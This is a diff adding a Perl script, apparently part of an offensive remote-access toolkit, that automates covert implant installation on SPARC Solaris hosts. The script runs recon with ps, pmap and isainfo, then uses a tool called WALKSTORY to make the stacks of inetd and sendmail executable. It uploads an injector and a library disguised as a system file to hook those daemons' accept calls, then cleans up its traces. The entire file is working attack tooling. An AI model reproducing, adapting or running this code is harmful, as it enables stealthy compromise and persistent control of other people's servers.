@@ -1,0 +1,473 @@
+#!/usr/bin/env perl
+##
+$VER="1.0" ;
+# nopen seems happier with stderr in lsh runs
+# or does it? Took it out now...
+select STDERR ;
+$| = 1 ;
+myinit() ;
+#mydie("DBG: Dying before pass $pass starts") if ($pass > 4) ;
+# each pass writes gs.jlinstantgratnext and calls next pass
+unless ($pass > 1) {
+  # 0th and 1st passes do no uploads/changes to target just recon
+  if (-e "$opdir/.isainfo.$nopen_rhostname") {
+
+    unlink("/current/.jlinstantgratpids.$nopen_rhostname");
+
+    doit("-cd /tmp",
+	 "ps -ef | egrep '(UID|$progegrep)' | grep -v grep >T:$opdir/.jlinstantgratpids.$nopen_rhostname",
+	);
+    nextpass($pass == 0 ?1:0);
+  } else {
+    unlink("/current/.isainfo");
+    # Not ready for pass 1 yet---this pass will run isainfo first, is all
+    doit("isainfo -kv >T:/current/.isainfo",
+	 "-lsh mv /current/.isainfo /current/.isainfo.$nopen_rhostname",
+	);
+    nextpass() ;
+  }
+} elsif ($pass == 2) {
+  # parse output of ps -ef from previous pass
+  if (open(IN,"< $opdir/.jlinstantgratpids.$nopen_rhostname")) {
+    my (%pid,%ppid,%owner,%which) = () ;
+    while (<IN>) {
+      s/^\s*// ;
+      next if (/^UID/) ;
+      my ($owner,$pid,$ppid,$c,$stime,$tty,$time,@cmd) = 
+	split(/\s+/) ;
+      my $cmd = "@cmd" ;
+      my ($which) = $cmd =~ /($progegrepshort)/ ;
+      foreach $prog  (@prog) {
+	if ($cmd =~ m#$prog#) {
+	  $pid{$prog} = $pid ;
+	  $which{$pid} = $which ;
+	  $ppid{$prog} = $ppid ;
+	  $owner{$prog} = $owner ;
+	}
+	unless ($owner eq "root" ) {
+	  pause("WARNING!! $owner owns $cmd and is not root!!");
+	}
+	unless ($ppid eq "1") {
+	  pause("WARNING!! Parent of $cmd is $ppid and not 1!!");
+	}
+      }
+    }
+    close(IN);
+    mydie("Could not find any pids of $proglist in ps output") unless
+      %pid ;
+    foreach $pid (keys %which) {
+      unlink("$opdir/.pmap.$nopen_rhostname.$which{$pid}.$pid");
+      doit("/usr/proc/bin/pmap $pid | grep stack >T:$opdir/.pmap.$nopen_rhostname.$which{$pid}.$pid");
+    }
+  } else {
+    mydie("Could not open < $opdir/.jlinstantgratpids.$nopen_rhostname to find pids");
+  }
+  nextpass();
+} elsif ($pass == 3) {
+  # parse output of pmap command(s) from previous pass
+  # starting uploads in this pass
+  $needws = "" ;
+  my @dows = checkstacks() ; # returns ws commands if needed
+  if (@dows) {
+    docomment("We need to run WALKSTORY to make stack executable");
+    doit("-put /current/up/ws ws") if ($bit32) ;
+    doit("-put /current/up/ws64 ws") if ($bit64) ;
+    $needws = "-w " ;
+    doit(@dows);
+  } else {
+    docomment("No need to run WALKSTORY to make stack executable.");
+  }
+  nextpass();
+} elsif ($pass == 4) {
+  # This pass checks if stacks are executable (which maybe they already were),
+  # confirming that WALKSTORY worked if it was used.
+  # Then we check inetd.conf to find a good port to use to prime the pump for
+  # inetd.
+  my @dows = checkstacks() ;
+  if (@dows) {
+    mydie("FATAL ERROR: WALKSTORY FAILED TO MAKE STACK(s) EXECUTABLE. YOU MUST TROUBLESHOOT/CLEANUP MANUALLY");
+  } else {
+    docomment("Stacks are executable. WALKSTORY worked or was not needed.");
+  }
+  my ($inetdsvc,$inetdconf) = () ;
+  my $notdownloaded = "It appears inetd.conf has not been downloaded yet from
+$nopen_rhostname. Use this in another window to do so and then hit return:
+
+-get /etc/inetd.conf /etc/inet/inetd.conf
+
+" ;
+  my @inetdfiles = ("$opdown/$nopen_rhostname/etc/inetd.conf",
+		      "$opdown/$nopen_rhostname/etc/inet/inetd.conf") ;
+  until ($inetdsvc) {
+    foreach $inetdfile (@inetdfiles) {
+      open(IN,"<$inetdfile") || next ;
+      $notdownloaded = ""; # we do have a copy
+      while (<IN>) {
+	s/^\s*// ;
+	next if (/^#/);
+	$inetdconf .= $_ ;
+	my ($svc,$type,$prot) = split(/\s+/) ;
+	$svc{$svc}++ if ($prot =~ /^tcp[6]{0,1}/) ;
+      }
+      close(IN);
+      if    ($svc{"discard"}) { $inetdsvc = "discard" ;}
+      elsif ($svc{"9"      }) { $inetdsvc = "9" ;}
+      elsif ($svc{"daytime"}) { $inetdsvc = "daytime" ;}
+      elsif ($svc{"13"})      { $inetdsvc = "13" ;}
+      elsif ($svc{"chargen"}) {	$inetdsvc = "chargen" ;}
+      elsif ($svc{"19"}) {	$inetdsvc = "19" ;}
+      elsif ($svc{"time"})    { $inetdsvc = "time" ;}
+      elsif ($svc{"37"})      { $inetdsvc = "37" ;}
+      elsif ($svc{"echo"})    {	$inetdsvc = "echo" ;}
+      elsif ($svc{"7"})       {	$inetdsvc = "7" ;}
+    }
+
+    last if $inetdsvc ;
+    $inetdsvc = getinput("\n\n$inetdconf$notdownloaded
+
+Preferred ports (discard|daytime|chargen|time|echo) not found in inetd.conf.
+
+Choose a port to prime inetd by name or number,
+or enter \"0\" to skip priming inetd: ") ;
+    last if ($inetdsvc eq "0") ;
+  }
+  @doitlater = () ; # this did not wipe anything saved in there right?
+  foreach $prog (split(/\|/,$progegrepshort)) {
+    my $port = "" ;
+    if ($prog eq "inetd") {
+      if ($inetdsvc eq "0") {
+	docomment("NOT PRIMING INETD") ;
+	next;
+      }
+      $port = $inetdsvc ;
+    }
+    $port = "25" if ($prog eq "sendmail") ;
+    if ($pid{$prog}) {
+      until (length $port) {
+	$port = getinput("\n\n
+Choose a port to prime $prog by name or number, or enter \"0\" to skip priming $prog: ") ;
+	last if ($port eq "0") ;
+      }
+      if ($port eq "0") {
+	docomment("NOT PRIMING $prog");
+	next ;
+      }
+      next unless (length $port) ;
+      docommentlater("Priming IGJL for $prog.");
+      doitlater("./th -l $workdir/libmsl.so.1 -w accept -p $pid{$prog} & telnet 127.0.0.1 $port < /dev/null");
+    } else {
+      docomment("Cannot prime IGJL for $prog...$opdir/.pmap.$nopen_rhostname.$prog.* not found");
+    }
+  }# foreach $prog
+  if (@doitlater) {
+    doitnow("-put /current/up/libsocket.so.1 libmsl.so.1",
+	    "-put /current/up/th th",
+	   );
+    
+    doit("-rm th libmsl.so.1");
+
+  } else {
+    docomment("Not uploading TH: Not priming anything.");
+  }
+  my @dows = checkstacks() ; # returns ws commands if needed
+  docomment("Set things back the way they were") if @dows;
+  foreach $cmd (@dows) {
+    $cmd =~ s/0x0f/0x0b/ ;
+    doit($cmd);
+#"./ws $pid 0x$address 0x0b |tail -2 >T:$opdir/.wsout.$nopen_rhostname.$which{$pid}.$pid",
+  }
+  doit("-cdp");
+#  nextpass();
+#} elsif ($pass == 5) {
+  unlink(@pmapfiles); # done with these now
+}#ENDMAIN
+close(OUT);
+
+sub mydie {
+  local ($what,$color,$color2,$what2) = (@_) ;
+  local $newlines ;
+  while ((substr($what,0,1) eq "\r") or (substr($what,0,1) eq "\n")) {
+    $newlines .= substr($what,0,1) ;
+    $what = substr($what,1) ;
+  }
+  $color = $COLOR_FAILURE unless $color ;
+  $color2 = $color unless $color2 ;
+  $what2 = " $what2" if ($what2) ;
+  warn  "$newlines${color2}${prog}[$$]$what2\a: ${color}$what$COLOR_NORMAL\n" ;
+  exit 1;
+}#mydie
+
+sub usage {
+  print "\nFATAL ERROR: @_\n" if ( @_ );
+  $usagetext = $gsusagetext if ($nopen_mypid) ;
+  print $usagetext unless $opt_v ;
+  print $vertext ;
+  print "\nFATAL ERROR: @_\n" if ( @_ );
+  exit;
+}#usage
+
+sub myinit {
+  use File::Basename ;
+  require "getopts.pl";
+  $COLOR_SUCCESS="\033[1;32m";
+  $COLOR_FAILURE="\033[1;31m";
+  $COLOR_WARNING="\033[1;33m";
+  $COLOR_NORMAL="\033[0;39m";
+  $COLOR_NOTE="\033[0;34m";
+  $prog = basename $0 ;
+  $prog = "-gs jlinstantgrat" ;
+  $vertext = "$prog version $VER\n" ;
+  $| = 1;
+  $nopen_mypid = $ENV{NOPEN_MYPID} ;
+  $nopen_mylog = $ENV{NOPEN_MYLOG} ;
+  $nopen_rhostname = $ENV{NOPEN_RHOSTNAME} ;
+  $nopen_serverinfo = $ENV{NOPEN_SERVERINFO} ;
+  $gsoptions = $ENV{GSOPTIONS} ;
+  ($nopen_ip) = $nopen_rhostname =~ /\.(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/ ;
+  mydie("No user servicable parts inside.\n".
+	"(I.e., noclient calls $prog, not you.)\n".
+	"$vertext") unless $nopen_rhostname;
+  $opdir = "/current" ;
+  $opbin = "$opdir/bin" ;
+  $opetc = "$opdir/etc" ;
+  $opdown = "$opdir/down" ;
+  $opup = "$opdir/up" ;
+  ($nopen_version) = 
+    `grep "^RAT client" $opdown/hostinfo.$nopen_rhostname 2>/dev/null | tail -1`
+      =~ /([\d.]+)/ ;
+  $nohist = "-nohist " if ($nopen_version ge "3") ;
+  $ext = "$$" ; # some uniqueness to me
+  #DEFAULTS
+  $workdir = "/tmp" ;
+  $updir = $opup ;
+  @prog = ("inetd","/usr/lib/sendmail") ;
+  ($proglist,$progegrep,$progegrepshort) = makelists(@prog) ;
+
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session via when \"$prog\" is used.
+
+";
+  $gsusagetext="
+Usage: $prog 
+
+$prog is used to automatically detect whether the host is a
+candidate for an instant grat JACKLADDER install by using WALKSTORY
+(if needed) and then TIMIDHASTE. If it is, $prog does so.
+
+$prog calls $opetc/autojlinstantgrat several times as
+it determines the various requirements of each stage of the install,
+and each time it creates and then calls gs.jlinstantgratnext. Each
+pass either gathers more information or acts on output from a previous
+pass.
+
+End result: JL instant grat install via timidhaste and (if needed)
+walkstory on the target programs specified (via -t, which defaults
+to inetd and sendmail).
+
+OPTIONS
+
+ -u dir    Directory in which to find files to upload [$updir]
+ -d dir    Working directory to make/cd to [$workdir]
+ -t list   Comma separated list of JL target programs [@prog]
+
+";
+  mydie("bad option(s)") if (! Getopts( "hvup:d:t:w" ) ) ;
+  $origparms = "" ;
+  $usingws = $opt_w ; # used near end so we remove ws
+  $origparms .= "-w " if $usingws ;
+  if ($opt_d) {
+    $workdir = $opt_d ;
+    $origparms .= " -d $opt_d" ;
+  }
+  mydie("-d working-dir must begin with /") unless ($workdir =~ /^\.{0,1}\//) ;
+  if ($opt_u) {
+    $updir = $opt_u ;
+    mydie("$updir does not exist or cannot read it")
+      unless(-d $updir and -r _) ;
+    $origparms .=" -u $updir" ;
+  }
+  $pass = int($opt_p) ;
+  mydie("Invalid -p argument") unless ($pass == $opt_p) ;
+  usage() if (($opt_h or $opt_v) and !$nopen_mylog) ;
+  if (open(OUT,"> $opetc/gs.jlinstantgratnext")) {
+    doit("#NOGS") ;
+#    doit("-lsh rm -f $opetc/gs.jlinstantgratnext") ;
+    doit("-lsh mv $opetc/gs.jlinstantgratnext $opetc/gs.jlinstantgratnext.last.$$") ;
+  } else {
+    usage() if ($opt_h or $opt_v) ;
+    mydie("Unable to open >> $opetc/gs.jlinstantgratnext");
+  }
+  usage() if ($opt_h or $opt_v) ;
+  while (@ARGV) {
+    $dowhat = $1 if ($ARGV[0] =~ /^(standalone|upgrade|abort)$/);
+    shift(@ARGV);
+  }
+#  until ($dowhat =~ /^(standalone|upgrade|abort)$/ ) {
+#    $ans =getinput("\n\nDo which, <S>tandalone, <U>pgrade or <A>bort?","U") ;
+#    $dowhat = "standalone" if ($ans =~ /^s/i) ;
+#    $dowhat = "upgrade" if ($ans =~ /^u/i) ;
+#    $dowhat = "abort" if ($ans =~ /^a/i) ;
+#  }
+  mydie("$prog aborted") if $dowhat eq "abort";
+  my ($targetver) = $nopen_serverinfo =~ /([\d\.]+)/ ;
+  # must default to 32 bit since isainfo not on 2.6 and below
+  $bitver = 32 unless $bitver ;
+  if (open(IN,"< $opdir/.isainfo.$nopen_rhostname")) {
+    while (<IN>) {
+      $bitver = 32 if /32/ ;
+      $bitver = 64 if /64/ ;
+    }
+    close(IN);
+  }
+  $bit32 = 1 if ($bitver == 32) ;
+  $bit64 = 1 if ($bitver == 64) ;
+  $solaris7plus = 1 if ($targetver ge "5.7") ;
+  if ($targetver lt "2.6" or $nopen_serverinfo =~ /86/) {
+    mydie("Target must be sparc solaris 5.6 - 5.9");
+  }
+  rename("$updir/ws32","$updir/ws")
+    if (-e "$updir/ws32" and !-e "$updir/ws") ;
+  foreach $file ("ws","libsocket.so.1","th") {
+    mydie("$updir must contain ws, libsocket.so.1 and th to use $prog ($updir/$file)") unless
+      (-s "$updir/$file") ;
+  }
+  if ($bit64) {
+    mydie("$updir/ws64 must exist to use $prog on a 64 bit host") unless
+    (-s "$updir/ws64") ;
+  }
+  $itflip = "$updir/../bin/itflip" ;
+  $itflip = "$opbin/itflip" if (! -x $itflip and -x "$opbin/itflip") ;
+  mydie("Cannot find itflip2 in $opup/../bin or $opbin")
+    unless (-x $itflip) ;
+  if ($opt_t) {
+    @prog = split(/,/ , $opt_t) ;
+    ($proglist,$progegrep,$progegrepshort) =
+      makelists(@prog) ;
+    $origparms .= "-t $opt_t" ;
+  }
+  @pmapfiles = split(/\n/,`find $opdir/.pmap.$nopen_rhostname.* 2>/dev/null`);
+}#myinit
+sub getinput {
+  local($prompt,$default,@allowed) = @_;
+  local($ans,$tmp,%other) = ();
+  $other{"Y"} = "N" ; $other{"N"} = "Y" ;
+  if ($other{$default} and ! (@allowed)) {
+    push(@allowed,$other{$default}) ;
+  }
+  $tmp = $default;
+  if (chop($tmp) eq "") {
+    #damn ^M's in script files
+    $default = $tmp;
+  }
+  SUB: while (1) {
+    print STDERR $prompt;
+    if ($default) {
+      print STDERR " [$default] ";
+    } else {
+      print STDERR " ";
+    }
+    chomp($ans = <STDIN>);
+    $ans = $default if ( $ans eq "" );
+    last SUB if ($#allowed < 0) ;
+    foreach ($default,@allowed) {
+      last SUB if $ans =~ /^$_/i ;
+    }
+  }
+  return $ans;
+} # getinput
+sub doit {
+  local (@cmds) = (@_) ;
+  foreach $cmd (@cmds) {
+    if ($cmd eq "#NOGS") {
+      print OUT ("$cmd\n");
+    } else {
+      print OUT ("${nohist}$cmd\n");
+    }
+  }
+}#doit
+sub doitlater {
+  # Saves off commands for later (say after upload) in global @doitlater
+  # If @doitlater is empty when checks are done, skip upload.
+  # Can skip all of @doitlater by running doitnow("NEVERMIND");
+  local (@cmds) = (@_) ;
+  foreach $cmd (@cmds) {
+    push(@doitlater,"${nohist}$cmd\n");
+  }
+}#doitlater
+sub doitnow {
+  # Do commands just sent first, then all of @doitlater
+  # and reset @doitlater to nil.
+  doit(@_,@doitlater) unless ($_[0] eq "NEVERMIND");
+  @doitlater = () ;
+}#doitnow
+sub docomment {
+  local ($comment) = (@_) ;
+  doit("-lsh echo -e \"\\\\a\\\\n\\\\n$comment\\\\n\\\\n\"") if $comment ;
+}#docomment
+sub docommentlater {
+  local ($comment) = (@_) ;
+  doitlater("-lsh echo -e \"\\\\a\\\\n\\\\n$comment\\\\n\\\\n\"") if $comment ;
+}#docommentlater
+sub pause {
+  local ($comment) = (@_) ;
+  docomment($comment) if $comment;
+  doit("-pause Break with ^C to abort");
+}#pause
+sub dbg {
+  warn("@_\n");
+}#dbg
+sub nextpass {
+  # arg of -1 means do not use -p arg on next call
+  # arg of positive int means skip that many passes ahead
+  my $p = "" ;
+  unless ($_[0] < 0) {
+    my $skip = $_[0] if ($_[0] > 0) ;
+    my $tmp = int($pass) + $skip + 1 ;
+    $p = "-p $tmp";
+  }
+  $origparms .= $needws;
+  doit("-lsh $opdir/etc/autojlinstantgrat $origparms $p $dowhat",
+       "-gs jlinstantgratnext",
+      );
+}#nextpass
+sub checkstacks {
+  # returns commands to run ws if stack not executable
+  # also sets globals %address, %pid and %which
+  mydie("No pmap output files found ($opdir/.pmap.$nopen_rhostname.*)") unless
+    @pmapfiles ;
+  foreach $pmapfile (@pmapfiles) {
+    my ($which,$pid) = $pmapfile =~ /\.([^\.]+)\.(\d+)$/ ;
+    $which{$pid} = $which ;
+    $pid{$which} = $pid ;
+    my ($address,$size,$perms,@what,@dows) = () ;
+    open(IN,"<$pmapfile") || warn("Could not open <$pmapfile: $!") ;
+    while (<IN>) {
+      s/^\s*// ;
+      ($address,$size,$perms,@what) = split(/\s+/) ;
+      $address{$pid} = $address ;
+      unless ($perms =~ /..x/ or $perms =~ /exec/) {
+	unlink("$opdir/.wsout.$nopen_rhostname.$which.$pid") unless ($pass == 4);
+	push(@dows,
+	     "./ws $pid 0x$address 0x0f |tail -2 >T:$opdir/.wsout.$nopen_rhostname.$which.$pid",
+	    );
+      }
+    }
+  }
+  return @dows ;
+}#checkstacks
+sub makelists {
+  my $list = "@_";
+  my $listegrep = "$list" ;
+  $listegrep =~ s/ /\|/ ;
+  my $listshort = "" ;
+  $list =~ s/ /,/g ;
+  foreach (@_) {
+    $listegrepshort .= basename($_)."|" ;
+  }
+  chop($listegrepshort) ;
+  return ($list,$listegrep,$listegrepshort) ;
+}
